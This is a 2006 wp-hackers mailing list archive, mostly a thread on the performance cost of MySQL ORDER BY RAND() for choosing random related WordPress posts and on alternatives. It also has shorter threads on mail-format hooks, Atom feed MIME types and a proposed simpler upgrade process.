From mattias at winthernet.se  Wed Feb  1 00:12:40 2006
From: mattias at winthernet.se (Mattias Winther)
Date: Wed Feb  1 00:14:07 2006
Subject: [wp-hackers] Extending query_posts?
In-Reply-To: 18fe01c62695$4a397560$6e01a8c0@sixfour
Message-ID: <e8b829989dd285d1a4c2e81059c1f614@imap.scorpionshops.com>


Thanks, great link!

Well, as for my own blog, I'm using to generate recent posts in the same category, meaning that I'll have quite the long way to go before 1000 hits is becoming an issue. Then again, I would like to do a nice plug-in that can be trusted to perform at about the same speed with a ton of rows.

I guess it's time to brush up on my SQL.

/Mattias

On Tue, 31 Jan 2006 13:36:45 -0500, "David Chait" <davebytes@comcast.net> wrote:
> Yes, RAND is awful for ORDER BY.
> 
> http://jan.kneschke.de/projects/mysql/order-by-rand/
> 
> At the end, he shows times for 100, 1000, ... , 1M records.  RAND starts
> to
> 'hurt' even when just 1000 records.  He walks through building an
> alternate
> approach, still in SQL (though using sub-selects, so MySQL 4.1+).
> 
> Do you need a completely random entry from the entire data set?  Or would
> a
> random-but-recent entry work? (i.e., select post_id limit 100, pick a
> random
> entry or entries, then do the 'full' query with post_id in {list of
> selected
> ids}...)
> 
> -d
> 
> ----- Original Message -----
> From: "Mattias Winther" <mattias@winthernet.se>
> To: <wp-hackers@lists.automattic.com>
> Sent: Tuesday, January 31, 2006 12:27 PM
> Subject: Re: [wp-hackers] Extending query_posts?
> 
> 
> |
> | I can't find any specific references to the performance problems you are
> referring to... Anyone else out there who recognizes this, preferrably
> with
> some kind of link for further analysis? Or, someone with a huge database
> that can run the numbers?
> |
> | /Mattias
> |
> | On Mon, 30 Jan 2006 08:10:03 -0500, Scott johnson <fuzzygroup@gmail.com>
> wrote:
> | > I'd be careful with that.  My understanding of randomization in mysql
> | > is that the performance is awful.  I haven't done it myself but that's
> | > hwat I understand.
> | >
> | > Scott
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From davebytes at comcast.net  Wed Feb  1 01:13:53 2006
From: davebytes at comcast.net (David Chait)
Date: Wed Feb  1 01:15:13 2006
Subject: [wp-hackers] Extending query_posts?
References: <e8b829989dd285d1a4c2e81059c1f614@imap.scorpionshops.com>
Message-ID: <199301c626cc$c482fb20$6e01a8c0@sixfour>

If you are trying to do anything like CG-SameCat, the approach I used was to 
not use random in the select, but select posts (well, post ID and title 
really...) where the category matches, ordered by post ID (or date) 
descending, and limit of some factor time the number of random items asked 
for... Thus, you want say three random, but recent, related posts -- so grab 
the last 10 or 20 and then use PHP to pick a random few from the set.  Just 
a thought.

Completely random from entire posts table != completely random from recent 
posts in matching category... ;)

-d

----- Original Message ----- 
From: "Mattias Winther" <mattias@winthernet.se>
To: <wp-hackers@lists.automattic.com>
Sent: Tuesday, January 31, 2006 7:12 PM
Subject: Re: [wp-hackers] Extending query_posts?


|
| Thanks, great link!
|
| Well, as for my own blog, I'm using to generate recent posts in the same 
category, meaning that I'll have quite the long way to go before 1000 hits 
is becoming an issue. Then again, I would like to do a nice plug-in that can 
be trusted to perform at about the same speed with a ton of rows.
|
| I guess it's time to brush up on my SQL.
|
| /Mattias
|
| On Tue, 31 Jan 2006 13:36:45 -0500, "David Chait" <davebytes@comcast.net> 
wrote:
| > Yes, RAND is awful for ORDER BY.
| >
| > http://jan.kneschke.de/projects/mysql/order-by-rand/
| >
| > At the end, he shows times for 100, 1000, ... , 1M records.  RAND starts
| > to
| > 'hurt' even when just 1000 records.  He walks through building an
| > alternate
| > approach, still in SQL (though using sub-selects, so MySQL 4.1+).
| >
| > Do you need a completely random entry from the entire data set?  Or 
would
| > a
| > random-but-recent entry work? (i.e., select post_id limit 100, pick a
| > random
| > entry or entries, then do the 'full' query with post_id in {list of
| > selected
| > ids}...)
| >
| > -d
| >
| > ----- Original Message -----
| > From: "Mattias Winther" <mattias@winthernet.se>
| > To: <wp-hackers@lists.automattic.com>
| > Sent: Tuesday, January 31, 2006 12:27 PM
| > Subject: Re: [wp-hackers] Extending query_posts?
| >
| >
| > |
| > | I can't find any specific references to the performance problems you 
are
| > referring to... Anyone else out there who recognizes this, preferrably
| > with
| > some kind of link for further analysis? Or, someone with a huge database
| > that can run the numbers?
| > |
| > | /Mattias
| > |
| > | On Mon, 30 Jan 2006 08:10:03 -0500, Scott johnson 
<fuzzygroup@gmail.com>
| > wrote:
| > | > I'd be careful with that.  My understanding of randomization in 
mysql
| > | > is that the performance is awful.  I haven't done it myself but 
that's
| > | > hwat I understand.
| > | >
| > | > Scott
| >
| > _______________________________________________
| > wp-hackers mailing list
| > wp-hackers@lists.automattic.com
| > http://lists.automattic.com/mailman/listinfo/wp-hackers
|
| _______________________________________________
| wp-hackers mailing list
| wp-hackers@lists.automattic.com
| http://lists.automattic.com/mailman/listinfo/wp-hackers 

From mark.wordpress at txfx.net  Wed Feb  1 04:07:33 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Wed Feb  1 04:08:51 2006
Subject: [wp-hackers] Mail Format Hook
In-Reply-To: <e6ec604d0601310835n32733637g7401a8dd473097c0@mail.gmail.com>
References: <ca7320070601310749i4bb75c62ybb658d446b396051@mail.gmail.com>
	<43DF8C2D.6000004@midnightcircus.com>
	<e6ec604d0601310835n32733637g7401a8dd473097c0@mail.gmail.com>
Message-ID: <581EAB59-00FD-4189-A5DD-9D0B263870E4@txfx.net>

On Jan 31, 2006, at 11:35 AM, Andy Skelton wrote:

> On 1/31/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
>> Aaron Brazell wrote:
>>> Perhaps a bit far reaching, but are there available hooks for  
>>> mail formats?
>>
>> Most if not all of the mail functions can be overridden in a plugin,
>> since they reside in pluggable-functions.php
>
> True, but it would be nicer if there were filters in there. I had the
> same question last night and was disappointed in the answer.

Are these hooks sort of along the lines of what you are wanting?

http://wphooks.flatearth.org/search/comment_notification
http://wphooks.flatearth.org/search/comment_moderation

Note that they got altered in 2.0.1 to also pass the comment ID.

--
Mark Jaquith
http://txfx.net/


From aaron at technosailor.com  Wed Feb  1 04:11:33 2006
From: aaron at technosailor.com (Aaron Brazell)
Date: Wed Feb  1 04:12:50 2006
Subject: [wp-hackers] Mail Format Hook
In-Reply-To: <581EAB59-00FD-4189-A5DD-9D0B263870E4@txfx.net>
Message-ID: <20060201041245.0ECAD5C16@comox.textdrive.com>

> Are these hooks sort of along the lines of what you are wanting?
> 
> http://wphooks.flatearth.org/search/comment_notification
> http://wphooks.flatearth.org/search/comment_moderation
> 
> Note that they got altered in 2.0.1 to also pass the comment ID.
> 
> --
> Mark Jaquith

Exactly what I was looking for.  I have not done a search on the code for these yet, but I presume these exist currently and are not slated for future development?

From mark.wordpress at txfx.net  Wed Feb  1 04:18:02 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Wed Feb  1 04:19:21 2006
Subject: [wp-hackers] Mail Format Hook
In-Reply-To: <20060201041245.0ECAD5C16@comox.textdrive.com>
References: <20060201041245.0ECAD5C16@comox.textdrive.com>
Message-ID: <66007A78-C9D6-4E24-AA21-DD84101D8BE1@txfx.net>

On Jan 31, 2006, at 11:11 PM, Aaron Brazell wrote:

> I presume these exist currently and are not slated for future  
> development?

They exist in 2.0, but are rather handicapped, because all they pass  
is the string of the subject/e-mail/header ... in 2.0.1 they pass the  
comment ID as a second parameter, which means you can fetch that  
comment and any information relating to it, which makes the hook a  
heck of a lot more useful.

--
Mark Jaquith
http://txfx.net/


From aaron at technosailor.com  Wed Feb  1 04:20:13 2006
From: aaron at technosailor.com (Aaron Brazell)
Date: Wed Feb  1 04:21:27 2006
Subject: [wp-hackers] Mail Format Hook
In-Reply-To: <66007A78-C9D6-4E24-AA21-DD84101D8BE1@txfx.net>
Message-ID: <20060201042125.DE9D75C2E@comox.textdrive.com>

> They exist in 2.0, but are rather handicapped, because all they pass
> is the string of the subject/e-mail/header ... in 2.0.1 they pass the
> comment ID as a second parameter, which means you can fetch that
> comment and any information relating to it, which makes the hook a
> heck of a lot more useful.
> 
> --
> Mark Jaquith

Thanks, I'll do an SVN pull and get the latest code then.

-Aaron

From skeltoac at gmail.com  Wed Feb  1 04:21:22 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Wed Feb  1 04:22:36 2006
Subject: [wp-hackers] Mail Format Hook
In-Reply-To: <66007A78-C9D6-4E24-AA21-DD84101D8BE1@txfx.net>
References: <20060201041245.0ECAD5C16@comox.textdrive.com>
	<66007A78-C9D6-4E24-AA21-DD84101D8BE1@txfx.net>
Message-ID: <e6ec604d0601312021g67395ea1t83e9f5a5243b1d11@mail.gmail.com>

Oh, I was thinking of new user registration emails.
From aaron at technosailor.com  Wed Feb  1 04:30:12 2006
From: aaron at technosailor.com (Aaron Brazell)
Date: Wed Feb  1 04:31:29 2006
Subject: [wp-hackers] Mail Format Hook
In-Reply-To: <e6ec604d0601312021g67395ea1t83e9f5a5243b1d11@mail.gmail.com>
Message-ID: <20060201043124.F199F611E@comox.textdrive.com>

> Oh, I was thinking of new user registration emails.

>From my perspective, it actually makes more sense to move all of the mail templating features to the database and out of pluggable-functions.php. Provide access via a more centralized API.  Call it a conceptual idea more than an implementation idea.  In doing so, filters such as Mark's would have a broader scope, no?

From fuzzygroup at gmail.com  Wed Feb  1 05:12:54 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Wed Feb  1 05:14:10 2006
Subject: [wp-hackers] Extending query_posts?
In-Reply-To: <199301c626cc$c482fb20$6e01a8c0@sixfour>
References: <e8b829989dd285d1a4c2e81059c1f614@imap.scorpionshops.com>
	<199301c626cc$c482fb20$6e01a8c0@sixfour>
Message-ID: <8e1656660601312112w6a7040f4y813604a5b1b6cf49@mail.gmail.com>

What I used to do back at my last gig was, for sequential data, get a min /
max and then use php's rand function and then use a select (since auto
increments are consecutive).  And then use a recursive function if the
autoincrement id didn't exist for example.

The problem here is that whenever we did it we found that users rarely if
ever wanted true randomness.  Its almost always some type of "random but
within a set" and "wait for the details" type of thing.

now bear in mind my last gig was "index the blogosphere" (Feedster) which is
worlds different.  A lot of times 2 random selections would get data from
the same feed since we indexed data in order it was received. (hence the
comment about users not really wanting random).

Scott

On 1/31/06, David Chait <davebytes@comcast.net> wrote:
>
> If you are trying to do anything like CG-SameCat, the approach I used was
> to
> not use random in the select, but select posts (well, post ID and title
> really...) where the category matches, ordered by post ID (or date)
> descending, and limit of some factor time the number of random items asked
> for... Thus, you want say three random, but recent, related posts -- so
> grab
> the last 10 or 20 and then use PHP to pick a random few from the
> set.  Just
> a thought.
>
> Completely random from entire posts table != completely random from recent
> posts in matching category... ;)
>
> -d
>
> ----- Original Message -----
> From: "Mattias Winther" <mattias@winthernet.se>
> To: <wp-hackers@lists.automattic.com>
> Sent: Tuesday, January 31, 2006 7:12 PM
> Subject: Re: [wp-hackers] Extending query_posts?
>
>
> |
> | Thanks, great link!
> |
> | Well, as for my own blog, I'm using to generate recent posts in the same
> category, meaning that I'll have quite the long way to go before 1000 hits
> is becoming an issue. Then again, I would like to do a nice plug-in that
> can
> be trusted to perform at about the same speed with a ton of rows.
> |
> | I guess it's time to brush up on my SQL.
> |
> | /Mattias
> |
> | On Tue, 31 Jan 2006 13:36:45 -0500, "David Chait" <davebytes@comcast.net
> >
> wrote:
> | > Yes, RAND is awful for ORDER BY.
> | >
> | > http://jan.kneschke.de/projects/mysql/order-by-rand/
> | >
> | > At the end, he shows times for 100, 1000, ... , 1M records.  RAND
> starts
> | > to
> | > 'hurt' even when just 1000 records.  He walks through building an
> | > alternate
> | > approach, still in SQL (though using sub-selects, so MySQL 4.1+).
> | >
> | > Do you need a completely random entry from the entire data set?  Or
> would
> | > a
> | > random-but-recent entry work? (i.e., select post_id limit 100, pick a
> | > random
> | > entry or entries, then do the 'full' query with post_id in {list of
> | > selected
> | > ids}...)
> | >
> | > -d
> | >
> | > ----- Original Message -----
> | > From: "Mattias Winther" <mattias@winthernet.se>
> | > To: <wp-hackers@lists.automattic.com>
> | > Sent: Tuesday, January 31, 2006 12:27 PM
> | > Subject: Re: [wp-hackers] Extending query_posts?
> | >
> | >
> | > |
> | > | I can't find any specific references to the performance problems you
> are
> | > referring to... Anyone else out there who recognizes this, preferrably
> | > with
> | > some kind of link for further analysis? Or, someone with a huge
> database
> | > that can run the numbers?
> | > |
> | > | /Mattias
> | > |
> | > | On Mon, 30 Jan 2006 08:10:03 -0500, Scott johnson
> <fuzzygroup@gmail.com>
> | > wrote:
> | > | > I'd be careful with that.  My understanding of randomization in
> mysql
> | > | > is that the performance is awful.  I haven't done it myself but
> that's
> | > | > hwat I understand.
> | > | >
> | > | > Scott
> | >
> | > _______________________________________________
> | > wp-hackers mailing list
> | > wp-hackers@lists.automattic.com
> | > http://lists.automattic.com/mailman/listinfo/wp-hackers
> |
> | _______________________________________________
> | wp-hackers mailing list
> | wp-hackers@lists.automattic.com
> | http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From mattias at winthernet.se  Wed Feb  1 05:18:27 2006
From: mattias at winthernet.se (Mattias Winther)
Date: Wed Feb  1 05:19:52 2006
Subject: [wp-hackers] Extending query_posts?
In-Reply-To: 199301c626cc$c482fb20$6e01a8c0@sixfour
Message-ID: <2bf01b16f66eecf6b424f76e129f2dff@imap.scorpionshops.com>


Well, my thought is to get completely random from all posts in matching categor(y|ies), so I'm somewhere in between. But, since ordering by random works without hurting up to about 1000 hits, and considering the amount of posts I have, combined with the amount of posts/day I write, I figure I'll have a few years before this becomes an actual problem for me personally... And I'm guessing that once I start hitting the numbers, I will indeed choose to pick between more recent posts.

Since I'm modifying the SQL ordering, from what I understand, the posts are first selected from the criteria, and then ordered according to, in my case, random order, which should mean that with selective query_posts-usage one should be able to use the simple version in a lot of cases, even with large number of posts, without suffering any real performance problems. Optimizing seems like a great idea, and once I get my new iMac, I'll have the hardware to test on too. :) What is the easiest way to populate a test instance of the database with, say, 10000 posts?

On Tue, 31 Jan 2006 20:13:53 -0500, "David Chait" <davebytes@comcast.net> wrote:
> If you are trying to do anything like CG-SameCat, the approach I used was
> to
> not use random in the select, but select posts (well, post ID and title
> really...) where the category matches, ordered by post ID (or date)
> descending, and limit of some factor time the number of random items asked
> for... Thus, you want say three random, but recent, related posts -- so
> grab
> the last 10 or 20 and then use PHP to pick a random few from the set. 
> Just
> a thought.
> 
> Completely random from entire posts table != completely random from recent
> posts in matching category... ;)
> 
> -d
> 
> ----- Original Message -----
> From: "Mattias Winther" <mattias@winthernet.se>
> To: <wp-hackers@lists.automattic.com>
> Sent: Tuesday, January 31, 2006 7:12 PM
> Subject: Re: [wp-hackers] Extending query_posts?
> 
> 
> |
> | Thanks, great link!
> |
> | Well, as for my own blog, I'm using to generate recent posts in the same
> category, meaning that I'll have quite the long way to go before 1000 hits
> is becoming an issue. Then again, I would like to do a nice plug-in that
> can
> be trusted to perform at about the same speed with a ton of rows.
> |
> | I guess it's time to brush up on my SQL.
> |
> | /Mattias
> |
> | On Tue, 31 Jan 2006 13:36:45 -0500, "David Chait"
> <davebytes@comcast.net>
> wrote:
> | > Yes, RAND is awful for ORDER BY.
> | >
> | > http://jan.kneschke.de/projects/mysql/order-by-rand/
> | >
> | > At the end, he shows times for 100, 1000, ... , 1M records.  RAND
> starts
> | > to
> | > 'hurt' even when just 1000 records.  He walks through building an
> | > alternate
> | > approach, still in SQL (though using sub-selects, so MySQL 4.1+).
> | >
> | > Do you need a completely random entry from the entire data set?  Or
> would
> | > a
> | > random-but-recent entry work? (i.e., select post_id limit 100, pick a
> | > random
> | > entry or entries, then do the 'full' query with post_id in {list of
> | > selected
> | > ids}...)
> | >
> | > -d
> | >
> | > ----- Original Message -----
> | > From: "Mattias Winther" <mattias@winthernet.se>
> | > To: <wp-hackers@lists.automattic.com>
> | > Sent: Tuesday, January 31, 2006 12:27 PM
> | > Subject: Re: [wp-hackers] Extending query_posts?
> | >
> | >
> | > |
> | > | I can't find any specific references to the performance problems you
> are
> | > referring to... Anyone else out there who recognizes this, preferrably
> | > with
> | > some kind of link for further analysis? Or, someone with a huge
> database
> | > that can run the numbers?
> | > |
> | > | /Mattias
> | > |
> | > | On Mon, 30 Jan 2006 08:10:03 -0500, Scott johnson
> <fuzzygroup@gmail.com>
> | > wrote:
> | > | > I'd be careful with that.  My understanding of randomization in
> mysql
> | > | > is that the performance is awful.  I haven't done it myself but
> that's
> | > | > hwat I understand.
> | > | >
> | > | > Scott
> | >
> | > _______________________________________________
> | > wp-hackers mailing list
> | > wp-hackers@lists.automattic.com
> | > http://lists.automattic.com/mailman/listinfo/wp-hackers
> |
> | _______________________________________________
> | wp-hackers mailing list
> | wp-hackers@lists.automattic.com
> | http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From fuzzygroup at gmail.com  Wed Feb  1 06:05:47 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Wed Feb  1 06:07:07 2006
Subject: [wp-hackers] Extending query_posts?
In-Reply-To: <2bf01b16f66eecf6b424f76e129f2dff@imap.scorpionshops.com>
References: <2bf01b16f66eecf6b424f76e129f2dff@imap.scorpionshops.com>
Message-ID: <8e1656660601312205r4f73e7b1w29b1f809ccad0d83@mail.gmail.com>

Another way to handle ordering by random ness is to hash a key in table and
then sort by the hash. Since the data distribution is basically fairly even,
that actually works ok (provided you clear the table periodically).

And yes my perspective is forever warped by terabyte + size mysql stuff.
Many things to me are fraught with danger (and I bloody well love MySQL just
its damn easy to run amok with it).

One thing I'd comment on is be careful with perfomance if your server is
getting any kind of load.  Use explain on your queries and watch ram
consumption.  When you use a lot of rand stuff even w/ little data involved
my gut feeling is *be careful*.  Be very, very careful.

S

On 2/1/06, Mattias Winther <mattias@winthernet.se> wrote:
>
>
> Well, my thought is to get completely random from all posts in matching
> categor(y|ies), so I'm somewhere in between. But, since ordering by random
> works without hurting up to about 1000 hits, and considering the amount of
> posts I have, combined with the amount of posts/day I write, I figure I'll
> have a few years before this becomes an actual problem for me personally...
> And I'm guessing that once I start hitting the numbers, I will indeed choose
> to pick between more recent posts.
>
> Since I'm modifying the SQL ordering, from what I understand, the posts
> are first selected from the criteria, and then ordered according to, in my
> case, random order, which should mean that with selective query_posts-usage
> one should be able to use the simple version in a lot of cases, even with
> large number of posts, without suffering any real performance problems.
> Optimizing seems like a great idea, and once I get my new iMac, I'll have
> the hardware to test on too. :) What is the easiest way to populate a test
> instance of the database with, say, 10000 posts?
>
> On Tue, 31 Jan 2006 20:13:53 -0500, "David Chait" <davebytes@comcast.net>
> wrote:
> > If you are trying to do anything like CG-SameCat, the approach I used
> was
> > to
> > not use random in the select, but select posts (well, post ID and title
> > really...) where the category matches, ordered by post ID (or date)
> > descending, and limit of some factor time the number of random items
> asked
> > for... Thus, you want say three random, but recent, related posts -- so
> > grab
> > the last 10 or 20 and then use PHP to pick a random few from the set.
> > Just
> > a thought.
> >
> > Completely random from entire posts table != completely random from
> recent
> > posts in matching category... ;)
> >
> > -d
> >
> > ----- Original Message -----
> > From: "Mattias Winther" <mattias@winthernet.se>
> > To: <wp-hackers@lists.automattic.com>
> > Sent: Tuesday, January 31, 2006 7:12 PM
> > Subject: Re: [wp-hackers] Extending query_posts?
> >
> >
> > |
> > | Thanks, great link!
> > |
> > | Well, as for my own blog, I'm using to generate recent posts in the
> same
> > category, meaning that I'll have quite the long way to go before 1000
> hits
> > is becoming an issue. Then again, I would like to do a nice plug-in that
> > can
> > be trusted to perform at about the same speed with a ton of rows.
> > |
> > | I guess it's time to brush up on my SQL.
> > |
> > | /Mattias
> > |
> > | On Tue, 31 Jan 2006 13:36:45 -0500, "David Chait"
> > <davebytes@comcast.net>
> > wrote:
> > | > Yes, RAND is awful for ORDER BY.
> > | >
> > | > http://jan.kneschke.de/projects/mysql/order-by-rand/
> > | >
> > | > At the end, he shows times for 100, 1000, ... , 1M records.  RAND
> > starts
> > | > to
> > | > 'hurt' even when just 1000 records.  He walks through building an
> > | > alternate
> > | > approach, still in SQL (though using sub-selects, so MySQL 4.1+).
> > | >
> > | > Do you need a completely random entry from the entire data set?  Or
> > would
> > | > a
> > | > random-but-recent entry work? (i.e., select post_id limit 100, pick
> a
> > | > random
> > | > entry or entries, then do the 'full' query with post_id in {list of
> > | > selected
> > | > ids}...)
> > | >
> > | > -d
> > | >
> > | > ----- Original Message -----
> > | > From: "Mattias Winther" <mattias@winthernet.se>
> > | > To: <wp-hackers@lists.automattic.com>
> > | > Sent: Tuesday, January 31, 2006 12:27 PM
> > | > Subject: Re: [wp-hackers] Extending query_posts?
> > | >
> > | >
> > | > |
> > | > | I can't find any specific references to the performance problems
> you
> > are
> > | > referring to... Anyone else out there who recognizes this,
> preferrably
> > | > with
> > | > some kind of link for further analysis? Or, someone with a huge
> > database
> > | > that can run the numbers?
> > | > |
> > | > | /Mattias
> > | > |
> > | > | On Mon, 30 Jan 2006 08:10:03 -0500, Scott johnson
> > <fuzzygroup@gmail.com>
> > | > wrote:
> > | > | > I'd be careful with that.  My understanding of randomization in
> > mysql
> > | > | > is that the performance is awful.  I haven't done it myself but
> > that's
> > | > | > hwat I understand.
> > | > | >
> > | > | > Scott
> > | >
> > | > _______________________________________________
> > | > wp-hackers mailing list
> > | > wp-hackers@lists.automattic.com
> > | > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > |
> > | _______________________________________________
> > | wp-hackers mailing list
> > | wp-hackers@lists.automattic.com
> > | http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers@lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



--
-------------------------------------------------------
J. Scott Johnson
Ookles launches 2/28/06 - have you signed up yet?
new startup: http://ookles.com/
blog: http://fuzzyblog.com/
podcast: http://techwarstories.com/
fuzzygroup@gmail.com
aim: fuzzygroup
cell: 857 222 6459
-------------------------------------------------------
From danny.ayers at gmail.com  Wed Feb  1 12:11:14 2006
From: danny.ayers at gmail.com (Danny Ayers)
Date: Wed Feb  1 12:12:32 2006
Subject: [wp-hackers] Atom mime type & browsers
Message-ID: <1f2ed5cd0602010411s1be0b2adya07ef6a3e9a878a5@mail.gmail.com>

[this was prompted by discussion on Apple's list, but I think the
forwarded material is worth placing in the wp-dev archives for future
ref]

I asked about workarounds for displaying Atom in browsers that didn't
recognise the media type. Basically Atom feeds SHOULD be served up
with "application/atom+xml".

There was quite a bit of back-and-forth on whether or not
"application/xml" was an acceptable substitute ("text/xml" was soundly
rejected). The thread starts here:
http://www.imc.org/atom-syntax/mail-archive/msg17802.html

The following contains a fairly comprehensive approach:

---------- Forwarded message ----------
From: John Panzer <jpanzer@aol.net>
Date: Jan 30, 2006 9:57 PM
Subject: Re: Browser behaviour

Here's my 'best effort' suggestion that we're looking to implement at AOL:

(1) All links from within feeds go to a resource of type
"application/atom+xml".
(2)  Header links (<link rel...>) in web pages to to a resource as in #1.
(3) Feed links displayed in web pages, which a user in a web browser
might click on, go to a resource of type "application/xml", which
contains exactly the same XML that would be contained in the Atom feed
resource of type "application/atom+xml", along with a style sheet that
causes said page to be rendered in a browser with subscribe links
(pointing to resource #1).  The web UI tries to guide users to subscribe
buttons first, before showing them a raw feed URL.

In other words, the application/xml content is a fallback for when
users, despite our best efforts, end up looking at XML content inside a
web browser.  I'd also be happy to make this behaviior browser-dependent
so that we serve application/atom+xml to browsers which will display it
inline with a style sheet, if there are any.

This means that users might possibly end up subscribing to something of
type application/xml if they copy and paste URL #3... but we could also
make this client dependent so that, for example, everything other than
known web browsers get application/atom+xml.  Not sure about that as
it's changing the MIME type, but I think it's changing it for a good
reason (working around what I think is a browser problem).

Comments welcomed.

-John



--

http://dannyayers.com
From mhancock at us.net  Wed Feb  1 14:45:59 2006
From: mhancock at us.net (Michael E. Hancock)
Date: Wed Feb  1 14:47:15 2006
Subject: [wp-hackers] Simplified Upgrade Process
Message-ID: <01da01c6273e$37dc7c10$6402a8c0@DELL8600>

After hearing complaints that both the upgrade and the upgrade instructions
are too complicated, I wonder can the upgrade be made this simple:
1.  Upload the upgrade file
2.  Change permissions on the appropriate files/folders (wish I could just
say folder)
3.  In the Admin panel, click on the Update WordPress button and follow the
instructions
4.  Change permissions back to correct state

Of course, step 3 is where all the heavy lifting would occur.
1.  Make a backup of the database and any 'customized' files
2.  Notify the user of the nature of the 'customized' file conflict and
allow option to halt the upgrade process
3.  Notify user of any incorrect permission settings and allow option to
halt the upgrade process
4.  Delete any files or folders such as wp-content/cache
5.  Deactivate the plugins and remember what was deactivated
6.  Extract any new/upgrade script file and delete any old unused script
files
7.  Update the database as necessary
8.  Reactivate the original list of plugins
9.  Warn user of any 'customized' files/scripts that need to be addressed
10. Advice user to chmod files/folders back to appropriate state
11. Place user back at Admin panel


Michael E. Hancock

From davebytes at comcast.net  Wed Feb  1 15:14:14 2006
From: davebytes at comcast.net (David Chait)
Date: Wed Feb  1 15:15:28 2006
Subject: [wp-hackers] Extending query_posts?
References: <2bf01b16f66eecf6b424f76e129f2dff@imap.scorpionshops.com>
Message-ID: <002201c62742$29d35b80$6e01a8c0@sixfour>

If you will only ever have say 200-300 posts with the category filtering, 
then you are probably okay -- if you really don't care about the overhead.

Note that I don't know the internals of MySQL, but I'd assume that in order 
to do an ORDER BY RAND(), I'd expect it has to randomize the ENTIRE table. 
Even with a LIMIT in place, I think it still computes the entire result 
table first.  That's why you are actually better off doing something like 
(butchering it here) select post id,post title from posts where category in 
(list of categories) order by post timestamp desc limit 100, then do a 
random routine that picks N items from the results.  Why?

1. select less data whenever possible.  with post id and title, you can make 
a link.

2. select a smaller result set.  category is your filter already, we'll 
stick with that.

3. don't randomize the entire set.  even in PHP, many of the randomization 
approaches will, say, randomize an entire array -- whereas you just want N 
random entries out of the array.  randomizing the entire set is wasteful.

4. overhead will continue to grow.  remember that this thing happens every 
pageload of a single page.  my approach could actually be further optimized 
by caching the results of the query for say 12h or something, and doing only 
the random-pick from the cache (I don't do this internal to CG-SameCat 
currently, but I think my home-grown query caching does it one level higher, 
for some number of hours).

best of luck,
-d

----- Original Message ----- 
From: "Mattias Winther" <mattias@winthernet.se>
To: <wp-hackers@lists.automattic.com>
Sent: Wednesday, February 01, 2006 12:18 AM
Subject: Re: [wp-hackers] Extending query_posts?


|
| Well, my thought is to get completely random from all posts in matching 
categor(y|ies), so I'm somewhere in between. But, since ordering by random 
works without hurting up to about 1000 hits, and considering the amount of 
posts I have, combined with the amount of posts/day I write, I figure I'll 
have a few years before this becomes an actual problem for me personally... 
And I'm guessing that once I start hitting the numbers, I will indeed choose 
to pick between more recent posts.
|
| Since I'm modifying the SQL ordering, from what I understand, the posts 
are first selected from the criteria, and then ordered according to, in my 
case, random order, which should mean that with selective query_posts-usage 
one should be able to use the simple version in a lot of cases, even with 
large number of posts, without suffering any real performance problems. 
Optimizing seems like a great idea, and once I get my new iMac, I'll have 
the hardware to test on too. :) What is the easiest way to populate a test 
instance of the database with, say, 10000 posts?
|
| On Tue, 31 Jan 2006 20:13:53 -0500, "David Chait" <davebytes@comcast.net> 
wrote:
| > If you are trying to do anything like CG-SameCat, the approach I used 
was
| > to
| > not use random in the select, but select posts (well, post ID and title
| > really...) where the category matches, ordered by post ID (or date)
| > descending, and limit of some factor time the number of random items 
asked
| > for... Thus, you want say three random, but recent, related posts -- so
| > grab
| > the last 10 or 20 and then use PHP to pick a random few from the set.
| > Just
| > a thought.
| >
| > Completely random from entire posts table != completely random from 
recent
| > posts in matching category... ;)
| >
| > -d
| >
| > ----- Original Message -----
| > From: "Mattias Winther" <mattias@winthernet.se>
| > To: <wp-hackers@lists.automattic.com>
| > Sent: Tuesday, January 31, 2006 7:12 PM
| > Subject: Re: [wp-hackers] Extending query_posts?
| >
| >
| > |
| > | Thanks, great link!
| > |
| > | Well, as for my own blog, I'm using to generate recent posts in the 
same
| > category, meaning that I'll have quite the long way to go before 1000 
hits
| > is becoming an issue. Then again, I would like to do a nice plug-in that
| > can
| > be trusted to perform at about the same speed with a ton of rows.
| > |
| > | I guess it's time to brush up on my SQL.
| > |
| > | /Mattias
| > |
| > | On Tue, 31 Jan 2006 13:36:45 -0500, "David Chait"
| > <davebytes@comcast.net>
| > wrote:
| > | > Yes, RAND is awful for ORDER BY.
| > | >
| > | > http://jan.kneschke.de/projects/mysql/order-by-rand/
| > | >
| > | > At the end, he shows times for 100, 1000, ... , 1M records.  RAND
| > starts
| > | > to
| > | > 'hurt' even when just 1000 records.  He walks through building an
| > | > alternate
| > | > approach, still in SQL (though using sub-selects, so MySQL 4.1+).
| > | >
| > | > Do you need a completely random entry from the entire data set?  Or
| > would
| > | > a
| > | > random-but-recent entry work? (i.e., select post_id limit 100, pick 
a
| > | > random
| > | > entry or entries, then do the 'full' query with post_id in {list of
| > | > selected
| > | > ids}...)
| > | >
| > | > -d
| > | >
| > | > ----- Original Message -----
| > | > From: "Mattias Winther" <mattias@winthernet.se>
| > | > To: <wp-hackers@lists.automattic.com>
| > | > Sent: Tuesday, January 31, 2006 12:27 PM
| > | > Subject: Re: [wp-hackers] Extending query_posts?
| > | >
| > | >
| > | > |
| > | > | I can't find any specific references to the performance problems 
you
| > are
| > | > referring to... Anyone else out there who recognizes this, 
preferrably
| > | > with
| > | > some kind of link for further analysis? Or, someone with a huge
| > database
| > | > that can run the numbers?
| > | > |
| > | > | /Mattias
| > | > |
